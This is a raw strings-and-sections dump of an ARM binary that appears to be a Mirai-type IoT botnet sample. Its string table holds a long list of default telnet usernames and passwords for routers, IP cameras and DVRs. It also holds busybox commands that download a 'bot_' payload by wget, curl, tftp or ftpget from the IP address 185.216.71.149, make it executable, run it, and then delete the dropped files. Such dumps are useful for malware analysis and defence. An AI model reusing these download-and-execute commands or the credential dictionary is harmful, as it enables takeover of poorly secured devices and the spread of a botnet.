Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000      0x0 0x00000000      0x0 ---- 
1   0x00000094     0x18 0x00008094     0x18 -r-x .init
2   0x000000b0  0x100d4 0x000080b0  0x100d4 -r-x .text
3   0x00010184     0x14 0x00018184     0x14 -r-x .fini
4   0x00010198   0xc87c 0x00018198   0xc87c -r-- .rodata
5   0x0001d000      0x8 0x0002d000      0x8 -rw- .ctors
6   0x0001d008      0x8 0x0002d008      0x8 -rw- .dtors
7   0x0001d014    0x688 0x0002d014    0x688 -rw- .data
8   0x0001d69c      0x0 0x0002d69c   0x2468 -rw- .bss
9   0x0001d69c     0x3e 0x00000000     0x3e ---- .shstrtab

[Segments]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000  0x1ca14 0x00008000  0x1ca14 -r-x LOAD0
1   0x0001d000    0x69c 0x0002d000   0x2b04 -rw- LOAD1
2   0x00000000      0x0 0x00000000      0x0 -rwx GNU_STACK
3   0x00000000     0x34 0x00008000     0x34 -rw- ehdr

[Entrypoints]
vaddr=0x00008190 paddr=0x00000190 haddr=0x00000018 hvaddr=0x00008018 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Main]
vaddr=0x0000c890 paddr=0x00004890
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Symbols]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――
[Strings]
nth paddr      vaddr      len  size section type    string
84  0x000105b0 0x000185b0 4    5    .rodata ascii   mico
85  0x000105b8 0x000185b8 4    5    .rodata ascii   WEMS
86  0x000105c0 0x000185c0 4    5    .rodata ascii   gast
87  0x000105c8 0x000185c8 8    9    .rodata ascii   glasshou
88  0x000105d8 0x000185d8 8    9    .rodata ascii   88fRK66Q
89  0x000105e4 0x000185e4 7    8    .rodata ascii   varuser
90  0x000105ec 0x000185ec 7    8    .rodata ascii   varview
91  0x000105f4 0x000185f4 4    5    .rodata ascii   wems
92  0x000105fc 0x000185fc 8    9    .rodata ascii   kup5EF4s
93  0x00010608 0x00018608 8    9    .rodata ascii   wemsuser
94  0x00010614 0x00018614 8    9    .rodata ascii   wemsview
95  0x00010620 0x00018620 11   12   .rodata ascii   adamcollect
96  0x0001062c 0x0001862c 11   12   .rodata ascii   c0113ctadam
97  0x00010638 0x00018638 13   14   .rodata ascii   (none) login:
98  0x00010650 0x00018650 6    7    .rodata ascii   daemon
99  0x00010658 0x00018658 5    6    .rodata ascii   team2
100 0x00010660 0x00018660 9    10   .rodata ascii   CMCCAdmin
101 0x0001066c 0x0001866c 9    10   .rodata ascii   aDm8H%MdA
102 0x00010678 0x00018678 7    8    .rodata ascii   CUAdmin
103 0x00010680 0x00018680 12   13   .rodata ascii   123qweasdzxc
104 0x00010690 0x00018690 15   16   .rodata ascii   CUAdmin52847709
105 0x000106a0 0x000186a0 5    6    .rodata ascii   USER1
106 0x000106a8 0x000186a8 10   11   .rodata ascii   0937795500
107 0x000106b4 0x000186b4 4    5    .rodata ascii   0000
108 0x000106bc 0x000186bc 12   13   .rodata ascii   7ujMko0admin
109 0x000106cc 0x000186cc 5    6    .rodata ascii   Sc8a1
110 0x000106d4 0x000186d4 13   14   .rodata ascii   adminXXXX1234
111 0x000106e4 0x000186e4 14   15   .rodata ascii   xxXX1234OOOOoo
112 0x000106f4 0x000186f4 8    9    .rodata ascii   1001chin
113 0x00010700 0x00018700 6    7    .rodata ascii   123456
114 0x0001070c 0x0001870c 13   14   .rodata ascii   7ujMko0vizxv 
115 0x0001071c 0x0001871c 6    7    .rodata ascii   antslq
116 0x00010724 0x00018724 8    9    .rodata ascii   hunt5759
117 0x00010730 0x00018730 8    9    .rodata ascii   icatch99
118 0x0001073c 0x0001873c 5    6    .rodata ascii   ivdev
119 0x00010744 0x00018744 8    9    .rodata ascii   juantech
120 0x00010750 0x00018750 5    6    .rodata ascii   jvbzd
121 0x00010758 0x00018758 5    6    .rodata ascii   vizxv
122 0x00010760 0x00018760 8    9    .rodata ascii   win1dows
123 0x0001076c 0x0001876c 5    6    .rodata ascii   zlxx.
124 0x00010774 0x00018774 12   13   .rodata ascii   telecomadmin
125 0x00010784 0x00018784 12   13   .rodata ascii   admintelecom
126 0x00010794 0x00018794 12   13   .rodata ascii   vstarcam2015
127 0x000107a4 0x000187a4 8    9    .rodata ascii   20150602
128 0x000107b0 0x000187b0 4    5    .rodata ascii   100Z
129 0x000107b8 0x000187b8 6    7    .rodata ascii   Pon521
130 0x000107c0 0x000187c0 9    10   .rodata ascii   Telkom135
131 0x000107cc 0x000187cc 6    7    .rodata ascii   Zte521
132 0x000107d4 0x000187d4 7    8    .rodata ascii   root621
133 0x000107dc 0x000187dc 4    5    .rodata ascii   125E
134 0x000107e4 0x000187e4 4    5    .rodata ascii   125G
135 0x000107ec 0x000187ec 5    6    .rodata ascii   127.0
136 0x000107f4 0x000187f4 7    8    .rodata ascii   vhd1206
137 0x000107fc 0x000187fc 7    8    .rodata ascii   059AnkJ
138 0x00010804 0x00018804 8    9    .rodata ascii   IPCam@sw
139 0x00010810 0x00018810 8    9    .rodata ascii   S2fGqNFs
140 0x0001081c 0x0001881c 9    10   .rodata ascii   annie2012
141 0x00010828 0x00018828 7    8    .rodata ascii   cat1029
142 0x00010830 0x00018830 8    9    .rodata ascii   cloud39e
143 0x0001083c 0x0001883c 7    8    .rodata ascii   cxlinux
144 0x00010844 0x00018844 6    7    .rodata ascii   hi3518
145 0x0001084c 0x0001884c 8    9    .rodata ascii   hipc3518
146 0x00010858 0x00018858 9    10   .rodata ascii   hkipc2016
147 0x00010864 0x00018864 6    7    .rodata ascii   ipc71a
148 0x0001086c 0x0001886c 8    9    .rodata ascii   jvth6cs2
149 0x00010878 0x00018878 11   12   .rodata ascii   jvtsmart123
150 0x00010884 0x00018884 6    7    .rodata ascii   klv123
151 0x0001088c 0x0001888c 9    10   .rodata ascii   tsgoingon
152 0x00010898 0x00018898 6    7    .rodata ascii   xc3511
153 0x000108a0 0x000188a0 7    8    .rodata ascii   xmhdipc
154 0x000108a8 0x000188a8 4    5    .rodata ascii   172.
155 0x000108b0 0x000188b0 12   13   .rodata ascii   123456789abc
156 0x000108c0 0x000188c0 4    5    .rodata ascii   2222
157 0x000108c8 0x000188c8 4    5    .rodata ascii   4321
158 0x000108d0 0x000188d0 9    10   .rodata ascii   hikvision
159 0x000108dc 0x000188dc 5    6    .rodata ascii   guest
160 0x000108e4 0x000188e4 4    5    .rodata ascii   192.
161 0x000108ec 0x000188ec 9    10   .rodata ascii   111111111
162 0x000108fc 0x000188fc 4    5    .rodata ascii   521G
163 0x00010904 0x00018904 11   12   .rodata ascii   ADSL Router
164 0x00010910 0x00018910 7    8    .rodata ascii   ATP Cli
165 0x00010918 0x00018918 8    9    .rodata ascii   !!Huawei
166 0x00010924 0x00018924 10   11   .rodata ascii   @HuaweiHgw
167 0x00010930 0x00018930 7    8    .rodata ascii   adminHW
168 0x00010938 0x00018938 7    8    .rodata ascii   lnadmin
169 0x00010940 0x00018940 7    8    .rodata ascii   support
170 0x00010948 0x00018948 8    9    .rodata ascii   Account:
171 0x00010954 0x00018954 6    7    .rodata ascii   Air544
172 0x00010960 0x00018960 10   11   .rodata ascii   superadmin
173 0x0001096c 0x0001896c 12   13   .rodata ascii   Is$uper@dmin
174 0x0001097c 0x0001897c 8    9    .rodata ascii   adslroot
175 0x00010988 0x00018988 6    7    .rodata ascii   263297
176 0x00010990 0x00018990 6    7    .rodata ascii   362729
177 0x00010998 0x00018998 7    8    .rodata ascii   admin01
178 0x000109a0 0x000189a0 9    10   .rodata ascii   admin1234
179 0x000109ac 0x000189ac 13   14   .rodata ascii   administrator
180 0x000109bc 0x000189bc 8    9    .rodata ascii   gvt12345
181 0x000109c8 0x000189c8 9    10   .rodata ascii   ho4uku6at
182 0x000109d4 0x000189d4 8    9    .rodata ascii   nE7jA%5m
183 0x000109e0 0x000189e0 17   18   .rodata ascii   CONSOLED launched
184 0x000109f4 0x000189f4 8    9    .rodata ascii   207B16th
185 0x00010a00 0x00018a00 8    9    .rodata ascii   CellPipe
186 0x00010a0c 0x00018a0c 12   13   .rodata ascii   supportadmin
187 0x00010a1c 0x00018a1c 12   13   .rodata ascii   CellPipe2013
188 0x00010a2c 0x00018a2c 6    7    .rodata ascii   DD-WRT
189 0x00010a34 0x00018a34 7    8    .rodata ascii   samsung
190 0x00010a3c 0x00018a3c 6    7    .rodata ascii   telnet
191 0x00010a44 0x00018a44 4    5    .rodata ascii   DEK-
192 0x00010a50 0x00018a50 8    9    .rodata ascii   FAST2604
193 0x00010a5c 0x00018a5c 13   14   .rodata ascii   FG1060N login
194 0x00010a6c 0x00018a6c 8    9    .rodata ascii   20080826
195 0x00010a78 0x00018a78 9    10   .rodata ascii   Freescale
196 0x00010a84 0x00018a84 5    6    .rodata ascii   GAPM-
197 0x00010a8c 0x00018a8c 4    5    .rodata ascii   GPON
198 0x00010a94 0x00018a94 9    10   .rodata ascii   adminvnpt
199 0x00010aa0 0x00018aa0 4    5    .rodata ascii   vnpt
200 0x00010aa8 0x00018aa8 8    9    .rodata ascii   adminisp
201 0x00010ab8 0x00018ab8 8    9    .rodata ascii   operator
202 0x00010ac4 0x00018ac4 8    9    .rodata ascii   oper@tor
203 0x00010ad0 0x00018ad0 10   11   .rodata ascii   support123
204 0x00010adc 0x00018adc 11   12   .rodata ascii   support1234
205 0x00010aec 0x00018aec 16   17   .rodata ascii   vertex25ektks123
206 0x00010b00 0x00018b00 13   14   .rodata ascii   HT-TM05 login
207 0x00010b14 0x00018b14 9    10   .rodata ascii   Hikvision
208 0x00010b20 0x00018b20 6    7    .rodata ascii   Huawei
209 0x00010b28 0x00018b28 16   17   .rodata ascii   adm1234intelecom
210 0x00010b3c 0x00018b3c 9    10   .rodata ascii   nexxadmin
211 0x00010b48 0x00018b48 15   16   .rodata ascii   y1n2inc.com0755
212 0x00010b58 0x00018b58 15   16   .rodata ascii   LocalHost login
213 0x00010b68 0x00018b68 9    10   .rodata ascii   M2M login
214 0x00010b74 0x00018b74 12   13   .rodata ascii   NEXTAV login
215 0x00010b84 0x00018b84 5    6    .rodata ascii   Night
216 0x00010b8c 0x00018b8c 20   21   .rodata ascii   No Radius configured
217 0x00010ba4 0x00018ba4 9    10   .rodata ascii   tiesseadm
218 0x00010bb0 0x00018bb0 18   19   .rodata ascii   OpenEmbedded Linux
219 0x00010bc4 0x00018bc4 10   11   .rodata ascii   oelinux123
220 0x00010bd0 0x00018bd0 14   15   .rodata ascii   PPPoE-template
221 0x00010be0 0x00018be0 12   13   .rodata ascii   Podlipki-3-6
222 0x00010bf4 0x00018bf4 25   26   .rodata ascii   Remote Management Console
223 0x00010c14 0x00018c14 12   13   .rodata ascii   SVWIFI login
224 0x00010c24 0x00018c24 15   16   .rodata ascii   ShAirDisk login
225 0x00010c34 0x00018c34 14   15   .rodata ascii   SmartLAN Login
226 0x00010c44 0x00018c44 9    10   .rodata ascii   666666666
227 0x00010c50 0x00018c50 6    7    .rodata ascii   Switch
228 0x00010c58 0x00018c58 7    8    .rodata ascii   premier
229 0x00010c64 0x00018c64 13   14   .rodata ascii   Administrator
230 0x00010c74 0x00018c74 7    8    .rodata ascii   Vision2
231 0x00010c7c 0x00018c7c 6    7    .rodata ascii   report
232 0x00010c84 0x00018c84 10   11   .rodata ascii   8Jg0SR8K50
233 0x00010c90 0x00018c90 6    7    .rodata ascii   TL-WR7
234 0x00010c9c 0x00018c9c 10   11   .rodata ascii   UserDevice
235 0x00010cac 0x00018cac 11   12   .rodata ascii   WD-N2 login
236 0x00010cb8 0x00018cb8 10   11   .rodata ascii   WD02 login
237 0x00010cc4 0x00018cc4 14   15   .rodata ascii   WIFIUSB2 login
238 0x00010cd4 0x00018cd4 15   16   .rodata ascii   WeZeeCard login
239 0x00010ce4 0x00018ce4 15   16   .rodata ascii   Welcome to VeEX
240 0x00010cf4 0x00018cf4 12   13   .rodata ascii   WiDisk login
241 0x00010d08 0x00018d08 9    10   .rodata ascii   founder88
242 0x00010d14 0x00018d14 7    8    .rodata ascii   solokey
243 0x00010d1c 0x00018d1c 8    9    .rodata ascii   colorkey
244 0x00010d2c 0x00018d2c 5    6    .rodata ascii   ZyXEL
245 0x00010d34 0x00018d34 14   15   .rodata ascii   aigoWiFi login
246 0x00010d44 0x00018d44 13   14   .rodata ascii   aquario login
247 0x00010d54 0x00018d54 7    8    .rodata ascii   aquario
248 0x00010d5c 0x00018d5c 8    9    .rodata ascii   h@32LuyD
249 0x00010d68 0x00018d68 8    9    .rodata ascii   comtrend
250 0x00010d78 0x00018d78 6    7    .rodata ascii   dvrdvs
251 0x00010d80 0x00018d80 7    8    .rodata ascii   guestvs
252 0x00010d88 0x00018d88 10   11   .rodata ascii   host login
253 0x00010d94 0x00018d94 12   13   .rodata ascii   7ujMko0vizxv
254 0x00010da4 0x00018da4 10   11   .rodata ascii   kopp login
255 0x00010db0 0x00018db0 4    5    .rodata ascii   kopp
256 0x00010db8 0x00018db8 13   14   .rodata ascii   netween.co.kr
257 0x00010dc8 0x00018dc8 4    5    .rodata ascii   baby
258 0x00010dd0 0x00018dd0 10   11   .rodata ascii   none login
259 0x00010ddc 0x00018ddc 7    8    .rodata ascii   openwrt
260 0x00010de4 0x00018de4 12   13   .rodata ascii   ralink login
261 0x00010df4 0x00018df4 9    10   .rodata ascii   username:
262 0x00010e00 0x00018e00 6    7    .rodata ascii   emcali
263 0x00010e08 0x00018e08 11   12   .rodata ascii   xDSL Router
264 0x00010e14 0x00018e14 12   13   .rodata ascii   CTLSupport12
265 0x00010e24 0x00018e24 9    10   .rodata ascii   vivo12345
266 0x00010e34 0x00018e34 8    9    .rodata ascii   kpn-adsl
267 0x00010e40 0x00018e40 4    5    .rodata ascii   zxic
268 0x00010e48 0x00018e48 6    7    .rodata ascii   of CLI
269 0x00010e50 0x00018e50 6    7    .rodata ascii   public
270 0x00010e5c 0x00018e5c 5    6    .rodata ascii   Adtec
271 0x00010e64 0x00018e64 5    6    .rodata ascii   adtec
272 0x00010e6c 0x00018e6c 4    5    .rodata ascii   none
273 0x00010e74 0x00018e74 7    8    .rodata ascii   1admin!
274 0x00010e7c 0x00018e7c 5    6    .rodata ascii   root1
275 0x00010e84 0x00018e84 6    7    .rodata ascii   1root!
276 0x00010e8c 0x00018e8c 8    9    .rodata ascii   adtecftp
277 0x00010e98 0x00018e98 12   13   .rodata ascii   adtecftp2231
278 0x00010ebc 0x00018ebc 7    8    .rodata ascii   busybox
279 0x00010ec4 0x00018ec4 4    5    .rodata ascii   help
280 0x00010ecc 0x00018ecc 80   81   .rodata ascii   /bin/busybox chmod 777 .d; ./.d > .f; /bin/busybox chmod 7777 .f; ./.f echo.%s\r\n
281 0x00010f24 0x00018f24 73   74   .rodata ascii   /bin/busybox echo -en '%s' %s .d && /bin/busybox echo -e '\x46\x49\x4e'\r\n
282 0x00010f74 0x00018f74 8    9    .rodata ascii   tc login
283 0x00010f80 0x00018f80 11   12   .rodata ascii   dnsekakf2$$
284 0x00010f8c 0x00018f8c 8    9    .rodata ascii   enable\r\n
285 0x00010f98 0x00018f98 8    9    .rodata ascii   system\r\n
286 0x00010fa4 0x00018fa4 7    8    .rodata ascii   shell\r\n
287 0x00010fac 0x00018fac 4    5    .rodata ascii   sh\r\n
288 0x00010fb4 0x00018fb4 142  143  .rodata ascii   /bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\r\n
289 0x00011048 0x00019048 9    10   .rodata ascii   .l && cd 
290 0x00011054 0x00019054 75   76   .rodata ascii   ; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox APPLET \r\n
291 0x000110a0 0x000190a0 9    10   .rodata ascii   PATH_DONE
292 0x000110ac 0x000190ac 16   17   .rodata ascii   applet not found
293 0x000110c0 0x000190c0 7    8    .rodata ascii   mdm9625
294 0x000110c8 0x000190c8 16   17   .rodata ascii   su\r\noelinux123\r\n
295 0x000110e0 0x000190e0 26   27   .rodata ascii   \r\nkill %%1\r\nrm -rf .d .f\r\n
296 0x000110fc 0x000190fc 175  176  .rodata ascii   /bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; /bin/busybox curl --help || curl --help; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'\r\n
297 0x000111b4 0x000191b4 10   11   .rodata ascii   sage: wget
298 0x000111c0 0x000191c0 101  102  .rodata ascii   /bin/busybox wget http://185.216.71.149/bot_%s_%s -O- > .f; /bin/busybox chmod 777 .f; ./.f wget.%s\r\n
299 0x00011228 0x00019228 12   13   .rodata ascii   sage: ftpget
300 0x00011238 0x00019238 92   93   .rodata ascii   /bin/busybox ftpget 185.216.71.149 .f bot_%s_%s; /bin/busybox chmod 777 .f; ./.f ftpget.%s\r\n
301 0x00011298 0x00019298 10   11   .rodata ascii   sage: curl
302 0x000112a4 0x000192a4 97   98   .rodata ascii   /bin/busybox curl http://185.216.71.149/bot_%s_%s > .f; /bin/busybox chmod 777 .f; ./.f curl.%s\r\n
303 0x00011308 0x00019308 10   11   .rodata ascii   sage: tftp
304 0x00011314 0x00019314 97   98   .rodata ascii   /bin/busybox tftp -r bot_%s_%s -l .f -g 185.216.71.149; /bin/busybox chmod 777 .f; ./.f tftp.%s\r\n
305 0x00011378 0x00019378 9    10   .rodata ascii   ECHO_DONE
306 0x00011384 0x00019384 9    10   .rodata ascii   >.d;>.f\r\n
307 0x00011394 0x00019394 8    9    .rodata ascii   iansin\r\n
308 0x000113a0 0x000193a0 14   15   .rodata ascii   listening tun0
309 0x000113b0 0x000193b0 25   26   .rodata ascii   socket: Permission denied
310 0x000113cc 0x000193cc 17   18   .rodata ascii   egmentation fault
311 0x000113e0 0x000193e0 9    10   .rodata ascii   >.f;>.d\r\n
312 0x000113ec 0x000193ec 5    6    .rodata ascii   /usr/
313 0x000113f4 0x000193f4 5    6    .rodata ascii   /mnt/
314 0x000113fc 0x000193fc 9    10   .rodata ascii   /var/run/
315 0x00011408 0x00019408 9    10   .rodata ascii   /dev/shm/
316 0x00011414 0x00019414 5    6    .rodata ascii   /etc/
317 0x0001141c 0x0001941c 5    6    .rodata ascii   /var/
318 0x00011424 0x00019424 5    6    .rodata ascii   /tmp/
319 0x0001142c 0x0001942c 5    6    .rodata ascii   /dev/
320 0x00011434 0x00019434 18   19   .rodata ascii   /var/home/user/fw/
